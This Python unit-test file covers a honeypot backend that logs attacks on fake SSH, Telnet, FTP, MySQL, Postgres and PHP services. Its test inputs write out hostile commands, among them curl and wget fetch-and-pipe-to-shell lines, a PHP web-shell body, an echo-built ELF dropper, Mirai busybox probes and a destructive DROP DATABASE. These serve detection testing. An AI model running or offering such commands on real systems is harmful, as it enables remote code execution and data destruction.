"""Unit-Tests: python3 -m unittest -v (im Verzeichnis backend/)."""
import hashlib
import http.client
import json
import os
import socket
import sqlite3
import struct
import tempfile
import threading
import time
import unittest

import honeypot_ftp
import honeypot_mysql
import honeypot_php
import honeypot_postgres
import honeypot_ssh
import honeypot_telnet
import fakeshell
import paramiko
import intel
import parsers
import samples
import sensors
import stats
import visits
from server import mask
from store import Store, modernize

NOW = time.mktime((2026, 10, 20, 12, 0, 0, 0, 0, -1))


class ParserTests(unittest.TestCase):
    def test_portsentry(self):
        ev = parsers.parse_syslog("Oct 19 18:29:40 3lis portsentry[593]: attackalert: TCP SYN/Normal scan "
                                  "from host: 94.31.119.184/94.31.119.184 to TCP port: 22", NOW)
        self.assertEqual((ev["type"], ev["port"], ev["ip"]), ("Port-Scan", 22, "94.31.119.184"))

    def test_portsentry_block_lines_ignored(self):
        self.assertIsNone(parsers.parse_syslog(
            'Oct 19 18:29:40 3lis portsentry[593]: attackalert: Host 1.2.3.4 has been blocked via wrappers', NOW))

    def test_ssh_invalid_user(self):
        ev = parsers.parse_auth("Oct 18 00:00:24 3lis sshd[1395421]: Invalid user alice from 223.17.1.118 port 38198", NOW)
        self.assertEqual(ev["type"], "SSH-Brute")
        self.assertIn("alice", ev["detail"])

    def test_f2b_ban_but_not_unban_or_restore(self):
        base = "2026-10-19 19:27:21,163 fail2ban.actions        [503]: NOTICE  [sshd] "
        self.assertEqual(parsers.parse_f2b(base + "Ban 107.174.82.77")["jail"], "sshd")
        self.assertIsNone(parsers.parse_f2b(base + "Unban 107.174.82.77"))
        self.assertIsNone(parsers.parse_f2b(base + "Restore Ban 107.174.82.77"))

    def test_nginx_probe_and_normal_request(self):
        probe = ('213.165.53.216 - - [20/Oct/2026:07:53:29 +0200] "GET /vendor/phpunit/eval-stdin.php HTTP/1.1" '
                 '404 153 "-" "libredtail-http"')
        self.assertEqual(parsers.parse_nginx_access(probe)["type"], "SQLi/RCE")
        normal = '1.2.3.4 - - [20/Oct/2026:07:53:29 +0200] "GET /strudel/ HTTP/2.0" 200 9 "-" "Mozilla"'
        self.assertIsNone(parsers.parse_nginx_access(normal))
        own = '1.2.3.4 - - [20/Oct/2026:07:53:29 +0200] "GET /assets/vendor/globe.gl.min.js HTTP/2.0" 200 9 "-" "Mozilla"'
        self.assertIsNone(parsers.parse_nginx_access(own))

    def test_nginx_ssl_error(self):
        ev = parsers.parse_nginx_error("2026/10/20 01:39:08 [crit] 549#549: *10928 SSL_do_handshake() failed "
                                       "(SSL: error:0A00006C:SSL routines::bad key share) while SSL handshaking, "
                                       "client: 118.194.251.101, server: 0.0.0.0:443")
        self.assertEqual((ev["type"], ev["detail"]), ("SSL-Scan", "TLS handshake: bad key share"))

    def test_syslog_year_rollover(self):
        jan = time.mktime((2027, 1, 1, 0, 10, 0, 0, 0, -1))
        ts = parsers.syslog_ts("Dec 31 23:59:00", jan)
        self.assertLess(ts, jan)


class LegacyFormatTests(unittest.TestCase):
    OLD = ["Login-Versuch als „root“ · Passwort „a”b“", "Befehl „uname -a“", "Login-Versuch als „(leer)“",
           "Sample „ab“ · 9 B · Skript · x · nicht gespeichert (Speicher voll)", "Gebannt durch Jail sshd"]
    NEW = ["Login attempt as “root” · password “a\"b”", "Command “uname -a”", "Login attempt as “(empty)”",
           "Sample “ab” · 9 B · script · x · not stored (storage full)", "Banned by jail sshd"]

    def test_old_sensor_events_are_translated_on_insert(self):
        store = Store(":memory:")
        store.add_events([parsers.event(1, "1.2.3.4", "SSH-Probe", "high", "honeypot", 22, d) for d in self.OLD])
        self.assertEqual([r[0] for r in store.query("SELECT detail FROM events ORDER BY id")], self.NEW)
        self.assertEqual([modernize(d) for d in self.NEW], self.NEW)  # idempotent

    def test_existing_database_is_migrated_once(self):
        with tempfile.TemporaryDirectory() as tmp:
            path = os.path.join(tmp, "x.db")
            Store(path).db.execute("PRAGMA user_version=0")
            db = sqlite3.connect(path)
            db.executemany("INSERT INTO events(ts, ip, type, detail) VALUES (1, '1.2.3.4', 'SSH-Probe', ?)",
                           [(d,) for d in self.OLD])
            db.commit()
            db.close()
            store = Store(path)
            self.assertEqual([r[0] for r in store.query("SELECT detail FROM events ORDER BY id")], self.NEW)
            self.assertEqual(store.query("PRAGMA user_version")[0][0], 1)


class StoreStatsTests(unittest.TestCase):
    def setUp(self):
        self.store = Store(":memory:")
        now = time.time()
        self.store.add_events([
            parsers.event(now - 10, "1.2.3.4", "Port-Scan", "med", "portsentry", 22, "TCP SYN"),
            parsers.event(now - 20, "1.2.3.4", "Port-Scan", "med", "portsentry", 22, "TCP SYN"),
            parsers.event(now - 30, "5.6.7.8", "SSH-Brute", "high", "sshd", 22022, "Login attempt as “root”"),
        ])
        self.store.save_geo([("1.2.3.4", 1, 2, "DE", "Germany", "Berlin", "ISP", "AS1", now, "Org", 1, 0, 0)])

    def test_feed_joins_geo(self):
        feed = self.store.feed()
        self.assertEqual(len(feed), 3)
        self.assertEqual([e["cc"] for e in feed], ["DE", "DE", None])  # neueste (nach ts) zuerst
        self.assertEqual(self.store.ips_without_geo(), ["5.6.7.8"])

    def test_stats(self):
        s = stats.compute(self.store, "1h")
        self.assertEqual((s["total"], s["uniqueIps"], s["countries"]), (3, 2, 1))
        self.assertEqual(s["portsTop"], [{"port": 22, "n": 2}])
        self.assertEqual(s["usersTop"], [{"type": "SSH-Brute", "user": "root", "n": 1}])
        self.assertEqual(sum(sum(row) for row in s["heatmap"]), 3)
        de = s["byCountry"]["DE"]
        self.assertEqual((de["n"], de["ips"], de["types"]), (2, 1, {"Port-Scan": 2}))
        self.assertEqual((s["hotspots"][0]["city"], s["hotspots"][0]["ips"]), ("Berlin", 1))


    def test_sensor_export_ingest(self):
        """Außensensor -> 3lis.de: Events kommen mit Sensor-Namen an, doppelte und neu nummerierte IDs werden erkannt."""
        remote = Store(":memory:")
        remote.add_events([parsers.event(time.time(), "9.9.9.9", "SSH-Probe", "high", "honeypot", 22, "x")])
        lines = lambda after: [json.dumps({"max": remote.query("SELECT MAX(id) FROM events")[0][0]})] + [
            json.dumps({"id": i, **e}) for i, e in remote.events_after(after)]
        self.assertEqual(sensors.ingest(self.store, "oci", lines(0)), 1)
        self.assertIsNone(sensors.ingest(self.store, "oci", lines(0)))  # nichts doppelt
        self.assertEqual(self.store.events_where("sensor", "oci", 0)[0], 1)
        self.assertEqual(self.store.events_where("sensor", "3lis", 0)[0], 3)
        self.store.set_offset("sensor:oci", 0, 50)  # Sensor-DB neu angelegt (max < letzte ID)
        self.assertEqual(sensors.ingest(self.store, "oci", lines(0)), 1)

    def test_old_geo_rows_are_refetched(self):
        self.store.save_geo([("1.2.3.4", 1, 2, "DE", "Germany", "Berlin", "ISP", "AS1", time.time())])
        self.assertIn("1.2.3.4", self.store.ips_without_geo())

    def test_events_where_and_profile(self):
        since = time.time() - 3600
        self.assertEqual(self.store.events_where("cc", "DE", since)[0], 2)
        self.assertEqual(self.store.events_where("user", "root", since)[0], 1)
        self.assertEqual(self.store.events_where("port", "22", since)[0], 2)
        first_id = self.store.feed()[0]["id"]
        self.assertEqual(self.store.events_where("ip", first_id, since)[0], 2)
        with self.assertRaises(KeyError):
            self.store.events_where("1=1; --", "x", since)
        ip, prof = self.store.ip_profile(first_id)
        self.assertEqual((ip, prof["n"], prof["types"], prof["geo"]["hosting"]), ("1.2.3.4", 2, {"Port-Scan": 2}, 1))


class IntelTests(unittest.TestCase):
    def test_classify(self):
        self.assertEqual(intel.classify("scanner-1.censys-scanner.com", None, None, 1, 0, 0)["name"], "Censys")
        self.assertEqual(intel.classify(None, "Some Telecom", None, False, False, False)["category"], "residential")
        self.assertEqual(intel.classify(None, "X", None, True, False, False)["category"], "cloud")
        gcp = intel.classify("x.1.2.3.bc.googleusercontent.com", "Google LLC", "Google Cloud (europe-west1)", 1, 0, 0)
        self.assertEqual((gcp["name"], gcp["category"]), ("Google Cloud", "cloud"))

    def test_mask_host(self):
        self.assertEqual(intel.mask_host("1-2-3-4.dsl.example.net", "1.2.3.4"), "1-2-3-x.dsl.example.net")
        self.assertEqual(intel.mask_host("4.3.2.1.in-addr.example", "1.2.3.4"), "x.3.2.1.in-addr.example")


class VisitsTests(unittest.TestCase):
    UA = "Mozilla/5.0 (X11; Linux x86_64) Firefox/131.0"

    def line(self, path, ip="5.6.7.8", ua=UA, status=200, ref="-", day="20"):
        return f'{ip} - - [{day}/Oct/2026:09:00:00 +0200] "GET {path} HTTP/2.0" {status} 9 "{ref}" "{ua}"'

    def setUp(self):
        self.root = tempfile.mkdtemp()
        os.makedirs(os.path.join(self.root, "strudel"))
        self.store = Store(":memory:")
        self.counter = visits.Visits(self.store)

    def test_parse_filters(self):
        parse = lambda line, mixed=False: visits.parse(line, mixed, self.root)
        self.assertEqual(parse(self.line("/strudel/index.html?x=1", ref="https://www.google.com/"))[4:],
                         ("/strudel/", "google.com"))
        self.assertIsNone(parse(self.line("/.env")))
        self.assertIsNone(parse(self.line("/gibtsnicht/")))
        self.assertIsNone(parse(self.line("/assets/js/main.js")))
        self.assertIsNone(parse(self.line("/", status=404)))
        self.assertIsNone(parse(self.line("/", ua="Mozilla/5.0 (compatible; Googlebot/2.1)")))
        self.assertIsNone(parse(self.line("/", ua="curl/8.0")))
        self.assertIsNotNone(parse(self.line("/", ref="https://home.3lis.de/")))
        self.assertIsNone(parse(self.line("/", ref="https://home.3lis.de/"), mixed=True))
        self.assertIsNone(parse(self.line("/x.css", ref="https://home.3lis.de/")))
        self.assertIsNone(parse(self.line("/x.css", ref="https://3lis.de/"))[4])  # Ressource -> Browser-Beleg
        self.assertIsNone(parse(self.line("/", ref="http://178.254.36.104/"))[5])

    def test_summary_counts_daily_visitors(self):
        self.store.add_events([parsers.event(NOW, "9.9.9.9", "Port-Scan", "low", "syslog", 22, "x")])
        own = "https://3lis.de/"
        self.counter.ingest([self.line("/"), self.line("/strudel/"), self.line("/", ip="1.1.1.1"),
                             self.line("/", day="19"), self.line("/", ip="9.9.9.9"), self.line("/", ip="2.2.2.2"),
                             # nur wer Ressourcen nachlädt, zählt; 2.2.2.2 holt nur das HTML
                             self.line("/api/feed", ref=own), self.line("/x.css", ip="1.1.1.1", ref=own),
                             self.line("/api/feed", day="19", ref=own), self.line("/api/feed", ip="9.9.9.9", ref=own)],
                            root=self.root)
        s = self.counter.summary(today=visits.date(2026, 10, 20))
        self.assertEqual(s["daily"], [{"day": "2026-10-19", "visitors": 1, "views": 1},
                                      {"day": "2026-10-20", "visitors": 2, "views": 3}])
        self.assertEqual(s["monthly"], [{"period": "2026-10", "visitors": 3, "views": 4}])
        self.assertEqual(s["pages"][0], ("/", 3))


SAMPLES = tempfile.TemporaryDirectory()
samples.DIR = SAMPLES.name  # Tests legen nie etwas unter /var/lib ab


class HoneypotBase(unittest.TestCase):
    def start(self, pot):
        self.store, self.pot = pot.store, pot
        ready = threading.Event()
        threading.Thread(target=pot.serve, args=(ready,), daemon=True).start()
        ready.wait(5)

    def wait_events(self, n):
        for _ in range(100):
            rows = self.store.query("SELECT type, sev, detail FROM events ORDER BY id")
            if len(rows) >= n:
                return rows
            time.sleep(0.05)
        return rows


class MySQLHoneypotTests(HoneypotBase):
    def setUp(self):
        self.start(honeypot_mysql.MySQLHoneypot(Store(":memory:"), port=0, host="127.0.0.1"))

    def connect(self):
        sock = socket.create_connection(("127.0.0.1", self.pot.port), timeout=5)
        _, greeting = honeypot_mysql._read_packet(sock)
        self.assertIn(b"MariaDB", greeting)
        return sock

    def test_login_is_accepted_and_queries_recorded(self):
        login = (struct.pack("<I", 0x0008A20F) + struct.pack("<I", 1 << 24) + b"\x21" + b"\0" * 23
                 + b"root\0" + bytes([20]) + b"x" * 20 + b"wordpress\0" + b"mysql_native_password\0")
        with self.connect() as sock:
            sock.sendall(honeypot_mysql.packet(1, login))
            seq, reply = honeypot_mysql._read_packet(sock)
            self.assertEqual((seq, reply[:1]), (2, b"\x00"))
            sock.sendall(honeypot_mysql.packet(0, b"\x03show databases"))
            replies = [honeypot_mysql._read_packet(sock)[1] for _ in range(8)]  # Anzahl, Spalte, EOF, 4 Zeilen, EOF
            self.assertIn(b"wordpress", replies[6])
            sock.sendall(honeypot_mysql.packet(0, b"\x03DROP DATABASE wordpress"))
            self.assertEqual(honeypot_mysql._read_packet(sock)[1][:1], b"\x00")
        rows = self.wait_events(3)
        self.assertEqual(rows[0], ("MySQL-Probe", "high", "Login attempt as “root” · DB “wordpress”"))
        self.assertEqual([r[2] for r in rows[1:]], ["Command “show databases”", "Command “DROP DATABASE wordpress”"])
        self.assertEqual(stats.compute(self.store, "24h")["usersTop"][0]["user"], "root")

    def test_scan_without_login(self):
        self.connect().close()
        self.assertEqual(self.wait_events(1)[0][1:], ("low", "Connection without login (service detection)"))


class PostgresHoneypotTests(HoneypotBase):
    def setUp(self):
        self.start(honeypot_postgres.PostgresHoneypot(Store(":memory:"), port=0, host="127.0.0.1"))

    def read(self, sock):
        kind, length = struct.unpack("!cI", honeypot_postgres._read(sock, 5))
        return kind, honeypot_postgres._read(sock, length - 4)

    def test_cleartext_login_and_copy_program_recorded(self):
        with socket.create_connection(("127.0.0.1", self.pot.port), timeout=5) as sock:
            sock.sendall(struct.pack("!II", 8, honeypot_postgres.SSL_REQUEST))
            self.assertEqual(sock.recv(1), b"N")
            params = b"user\0postgres\0database\0postgres\0\0"
            sock.sendall(struct.pack("!II", 8 + len(params), honeypot_postgres.PROTOCOL_3) + params)
            self.assertEqual(self.read(sock), (b"R", struct.pack("!I", 3)))
            sock.sendall(honeypot_postgres.message(b"p", b"geheim123\0"))
            kinds = []
            while not kinds or kinds[-1] != b"Z":
                kinds.append(self.read(sock)[0])
            self.assertEqual((kinds[0], kinds[-2]), (b"R", b"K"))
            sock.sendall(honeypot_postgres.message(b"Q", b"COPY t FROM PROGRAM 'curl x|sh'\0"))
            self.assertEqual(self.read(sock), (b"C", b"COPY 0\0"))
        rows = self.wait_events(2)
        self.assertEqual(rows[0], ("Postgres-Probe", "high", "Login attempt as “postgres” · password “geheim123”"))
        self.assertEqual(rows[1], ("Postgres-Probe", "crit", "Command “COPY t FROM PROGRAM 'curl x|sh'”"))
        top = stats.compute(self.store, "24h")
        self.assertEqual((top["passwordsTop"][0]["password"], top["commandsTop"][0]["command"]),
                         ("geheim123", "COPY t FROM PROGRAM 'curl x|sh'"))


class FTPHoneypotTests(HoneypotBase):
    def setUp(self):
        self.start(honeypot_ftp.FTPHoneypot(Store(":memory:"), port=0, host="127.0.0.1"))

    def test_login_is_recorded_and_denied(self):
        with socket.create_connection(("127.0.0.1", self.pot.port), timeout=5) as sock:
            lines = sock.makefile("rb")
            self.assertTrue(lines.readline().startswith(b"220"))
            sock.sendall("USER admin\r\nPASS 123“456”\r\nQUIT\r\n".encode())
            replies = [lines.readline()[:3] for _ in range(3)]
        self.assertEqual(replies, [b"331", b"530", b"221"])
        self.assertEqual(self.wait_events(1), [("FTP-Probe", "high", 'Login attempt as “admin” · password “123"456"”')])
        s = stats.compute(self.store, "24h")
        self.assertEqual(s["passwordsTop"], [{"password": '123"456"', "n": 1}])
        self.assertEqual(self.store.events_where("password", '123"456"', 0)[0], 1)


class PHPHoneypotTests(HoneypotBase):
    def setUp(self):
        self.start(honeypot_php.PHPHoneypot(Store(":memory:"), port=0))

    def request(self, method, path, body=None):
        conn = http.client.HTTPConnection("127.0.0.1", self.pot.port, timeout=5)
        conn.request(method, path, body, {"X-Real-IP": "203.0.113.7",
                                          "Content-Type": "application/x-www-form-urlencoded"})
        resp = conn.getresponse()
        return resp.getheader("X-Powered-By"), resp.read()

    def test_scan_without_payload_not_recorded(self):
        powered, page = self.request("GET", "/phpinfo.php")
        self.assertEqual(powered, "PHP/8.2.34")
        self.assertIn(b"PHP Version 8.2.34", page)
        self.assertEqual(self.wait_events(1), [])

    def test_wordpress_login_and_payload_recorded(self):
        self.request("POST", "/wp-login.php", "log=admin&pwd=geheim%21")
        self.request("POST", "/x/shell.php?c=id", "<?php system('id'); ?>")
        rows = self.wait_events(2)
        self.assertEqual(rows[0], ("PHP-Probe", "high", "Login attempt as “admin” · password “geheim!”"))
        self.assertEqual(rows[1], ("PHP-Probe", "crit", "Command “POST /x/shell.php c=id <?php system('id'); ?>”"))
        self.assertEqual(self.store.query("SELECT DISTINCT ip, port FROM events"), [("203.0.113.7", 443)])


class SSHHoneypotTests(HoneypotBase):
    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory()
        self.start(honeypot_ssh.SSHHoneypot(Store(":memory:"), port=0, host="127.0.0.1",
                                            key_path=os.path.join(self.tmp.name, "key")))

    def tearDown(self):
        self.tmp.cleanup()

    def session(self):
        client = paramiko.Transport(("127.0.0.1", self.pot.port))
        client.start_client(timeout=10)
        client.auth_password("root", "toor")
        return client, client.open_session()

    def test_scp_and_cat_uploads_become_samples(self):
        elf = b"\x7fELF\x01\x01\x01" + b"\0" * 11 + b"\x28\x00" + b"\0" * 100  # ARM
        client, chan = self.session()
        chan.exec_command("scp -t /tmp/")
        self.assertEqual(chan.recv(1), b"\0")
        chan.sendall(f"C0755 {len(elf)} bot.arm\n".encode())
        self.assertEqual(chan.recv(1), b"\0")
        chan.sendall(elf + b"\0")
        self.assertEqual(chan.recv(1), b"\0")
        chan.shutdown_write()
        chan.recv_exit_status()
        client.close()
        client, chan = self.session()  # der Honeypot bedient einen Kanal je Verbindung
        chan.exec_command("cat > .s; chmod +x .s")
        chan.sendall(b"#!/bin/sh\nwget x\n")
        chan.shutdown_write()
        chan.recv_exit_status()
        client.close()
        rows = [r for r in self.wait_events(5) if r[0] == "Malware-Sample"]
        self.assertEqual(len(rows), 2, rows)
        digest = samples.hashlib.sha256(elf).hexdigest()
        self.assertEqual(rows[0][2], f"Sample “{digest}” · {len(elf)} B · ELF ARM · scp bot.arm")
        self.assertTrue(rows[1][2].endswith("· script · cat > .s; chmod +x .s"))
        self.assertEqual(open(os.path.join(SAMPLES.name, digest), "rb").read(), elf)
        top = stats.compute(self.store, "24h")["samplesTop"]
        self.assertEqual({(s["kind"], s["n"]) for s in top}, {("ELF ARM", 1), ("script", 1)})
        self.assertEqual(self.store.events_where("sample", digest, 0)[0], 1)

    def test_key_denied_password_accepted_commands_recorded(self):
        client = paramiko.Transport(("127.0.0.1", self.pot.port))
        client.start_client(timeout=10)
        self.assertEqual(client.remote_version, honeypot_ssh.VERSION)
        key = paramiko.RSAKey.generate(1024)
        with self.assertRaises(paramiko.AuthenticationException):
            client.auth_publickey("root", key)
        client.auth_password("root", "toor")  # Benutzerwechsel je Verbindung lehnt SSH ab
        with self.assertRaises(paramiko.ChannelException):
            client.open_channel("direct-tcpip", ("example.org", 80), ("127.0.0.1", 1))  # kein offener Proxy
        chan = client.open_session()
        chan.exec_command("uname -a; /bin/busybox XQZ")
        out = chan.makefile("rb").read().decode()
        self.assertIn("armv7l", out)
        self.assertIn("XQZ: applet not found", out)
        client.close()
        rows = self.wait_events(3)
        self.assertEqual(rows[0][2], f"Login attempt as “root” · key ssh-rsa {honeypot_ssh.fingerprint(key)}")
        self.assertEqual(rows[1], ("SSH-Probe", "high", "Login attempt as “root” · password “toor”"))
        self.assertEqual(rows[2], ("SSH-Probe", "crit", "Command “uname -a; /bin/busybox XQZ”"))
        s = stats.compute(self.store, "24h")
        self.assertEqual(s["passwordsTop"], [{"password": "toor", "n": 1}])
        self.assertEqual(s["commandsTop"], [{"command": "uname -a; /bin/busybox XQZ", "n": 1}])

    def test_host_key_is_kept(self):
        again = honeypot_ssh.host_key(os.path.join(self.tmp.name, "key"))
        self.assertEqual(again.asbytes(), self.pot.key.asbytes())


class MaskTests(unittest.TestCase):
    def test_mask(self):
        self.assertEqual(mask("from 223.17.1.118 port 1"), "from 223.17.1.x port 1")


if __name__ == "__main__":
    unittest.main()


class TelnetHoneypotTests(HoneypotBase):
    def setUp(self):
        self.start(honeypot_telnet.TelnetHoneypot(Store(":memory:"), port=0, host="127.0.0.1"))

    def test_login_and_commands_are_recorded(self):
        with socket.create_connection(("127.0.0.1", self.pot.port), timeout=5) as sock:
            sock.sendall(b"\xff\xfd\x01\xff\xfb\x1fadmin\r\n")  # IAC-Verhandlung vor dem Namen
            time.sleep(0.1)
            sock.sendall(b"1234\r\nenable\r\n/bin/busybox MIRAI\r\nexit\r\n")
            out = b""
            while chunk := sock.recv(4096):
                out += chunk
        self.assertIn(b"MIRAI: applet not found", out)
        self.assertEqual([r[1:] for r in self.wait_events(4)], [
            ("high", "Login attempt as “admin” · password “1234”"), ("crit", "Command “enable”"),
            ("crit", "Command “/bin/busybox MIRAI”"), ("crit", "Command “exit”")])

    def test_echo_dropper_is_saved_after_disconnect(self):
        with socket.create_connection(("127.0.0.1", self.pot.port), timeout=5) as sock:
            sock.sendall(b"root\r\nroot\r\n")
            sock.sendall(b"echo -ne '\\x7f\\x45\\x4c\\x46\\x01\\x01' > .d\r\n")
            sock.sendall(b"echo -ne '" + b"\\x00" * 12 + b"\\x08\\x00' >> .d\r\n")
            time.sleep(0.3)
        rows = self.wait_events(4)
        self.assertEqual(rows[-1][0], "Malware-Sample")
        self.assertIn("· 20 B · ELF MIPS · echo > .d", rows[-1][2])


class FakeShellTests(unittest.TestCase):
    def test_responses(self):
        self.assertEqual(fakeshell.respond("echo -e '\\x41\\x4b'"), "AK\r\n")
        self.assertEqual(fakeshell.respond("cd /tmp; wget http://x/y.sh"), "wget: download timed out\r\n")
        self.assertEqual(fakeshell.respond("foo"), "sh: foo: not found\r\n")
        self.assertIsNone(fakeshell.respond("ls; exit"))

    def test_downloads_and_drops(self):
        self.assertEqual(fakeshell.downloads(
            "cd /tmp; wget http://1.2.3.4/x.sh -O- | sh; busybox curl -o y 5.6.7.8/y; tftp -g -r m.arm 9.9.9.9; "
            "tftp 8.8.8.8 -c get n.mips; ftpget a b c; wget ftp://h/z"),
            ["http://1.2.3.4/x.sh", "http://5.6.7.8/y", "tftp://9.9.9.9/m.arm", "tftp://8.8.8.8/n.mips"])
        self.assertEqual(fakeshell.respond("echo -ne '\\x41' > .t"), "")
        drops = fakeshell.Drops()
        drops.feed("echo -ne '\\x41\\x42' > .t; echo x")
        drops.feed("echo -ne '\\x43' >> .t")
        self.assertEqual(drops.files, {".t": b"ABC"})
        self.assertFalse(samples.looks_executable(b"ABC"))

    def test_samples_only_from_public_addresses(self):
        with self.assertRaises(ValueError):
            samples.public_ip("127.0.0.1")
        with self.assertRaises(ValueError):
            samples.public_ip("192.168.203.3")

    def test_lines_split_on_any_line_end(self):
        chunks = iter([b"a\r", b"\nb\rc", b"\n", b""])
        lines = fakeshell.Lines(lambda n: next(chunks))
        self.assertEqual([lines.next() for _ in range(4)], ["a", "b", "c", None])


class SensorSampleTests(unittest.TestCase):
    def test_missing_samples_are_pulled_and_verified(self):
        good, bad = b"\x7fELF good", b"\x7fELF bad"
        hashes = [hashlib.sha256(d).hexdigest() for d in (good, bad)] + ["c" * 64]
        store = Store(":memory:")
        store.add_events([parsers.event(1, "1.2.3.4", "Malware-Sample", "crit", "honeypot", 22,
                                        f"Sample “{h}” · 9 B · data · x") for h in hashes[:2]] +
                         [parsers.event(1, "1.2.3.4", "Malware-Sample", "crit", "honeypot", 22,
                                        f"Sample “{hashes[2]}” · 9 B · data · x · not stored (storage full)")])
        store.db.execute("UPDATE events SET sensor='oci'")
        asked, failed = [], set()

        def get(sensor, command):
            asked.append(command)
            return good if hashes[0] in command else b"tampered"
        sensors.pull_samples(store, {"name": "oci"}, failed, get)
        self.assertEqual(sorted(asked), sorted(f"sample {h}" for h in hashes[:2]))  # „not stored“ nicht anfragen
        self.assertTrue(os.path.exists(os.path.join(samples.DIR, hashes[0])))
        self.assertFalse(os.path.exists(os.path.join(samples.DIR, hashes[1])))  # falscher Hash verworfen
        sensors.pull_samples(store, {"name": "oci"}, failed, get)
        self.assertEqual(len(asked), 2)  # vorhanden bzw. fehlgeschlagen: nicht erneut
